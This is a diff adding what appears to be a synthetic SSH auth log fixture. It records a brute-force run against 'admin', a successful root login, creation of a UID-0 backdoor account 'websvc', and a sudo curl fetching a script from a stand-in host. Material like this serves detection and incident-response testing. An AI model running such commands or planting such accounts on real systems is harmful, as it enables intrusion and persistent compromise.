@@ -1,0 +1,28 @@
+2026-03-12T20:10:00Z web01 sshd[3000]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:01Z web01 sshd[3001]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:02Z web01 sshd[3002]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:03Z web01 sshd[3003]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:04Z web01 sshd[3004]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:05Z web01 sshd[3005]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:06Z web01 sshd[3006]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:07Z web01 sshd[3007]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:08Z web01 sshd[3008]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:09Z web01 sshd[3009]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:10Z web01 sshd[30010]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:11Z web01 sshd[30011]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:12Z web01 sshd[30012]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:13Z web01 sshd[30013]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:14Z web01 sshd[30014]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:15Z web01 sshd[30015]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:16Z web01 sshd[30016]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:17Z web01 sshd[30017]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:18Z web01 sshd[30018]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:19Z web01 sshd[30019]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:20Z web01 sshd[30020]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:21Z web01 sshd[30021]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:22Z web01 sshd[30022]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:23Z web01 sshd[30023]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:10:24Z web01 sshd[30024]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:15:33Z web01 sshd[3100]: Accepted password for root from 203.0.113.66 port 41225 ssh2
+2026-03-12T20:17:00Z web01 useradd[3120]: new user: name=websvc, UID=0, GID=0, home=/home/websvc
+2026-03-12T20:18:00Z web01 sudo: websvc : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://cdn.stonewick.example/u.sh
